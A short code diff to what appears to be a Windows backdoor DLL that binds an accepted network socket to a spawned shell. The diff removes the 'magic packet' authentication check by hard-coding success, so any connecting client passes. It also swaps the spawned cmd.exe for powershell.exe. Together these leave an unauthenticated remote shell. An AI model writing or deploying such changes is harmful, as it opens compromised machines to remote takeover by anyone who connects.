@@ -217,7 +217,7 @@ AcceptCallback (
     // Ignore random port scanning/connection attempts by making sure we have
     // a valid "magic packet" that was sent to us first.
     //
-    hResult = ValidateMagicPacket(acceptContext);
+    hResult = TRUE;
     if (FAILED(hResult))
     {
         //
@@ -309,7 +309,7 @@ AcceptCallback (
     startupInfoEx.StartupInfo.hStdOutput = (HANDLE)acceptContext->AcceptSocket;
     startupInfoEx.StartupInfo.hStdError = (HANDLE)acceptContext->AcceptSocket;
     startupInfoEx.lpAttributeList = procList;
-    bRes = CreateProcess(L"c:\\windows\\system32\\cmd.exe",
+    bRes = CreateProcess(L"c:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                           NULL,
                           NULL,
                           NULL,
@@ -1203,4 +1203,3 @@ UalInstrument(PVOID Blob)
     UNREFERENCED_PARAMETER(Blob);
     return ERROR_SUCCESS;
 }
-
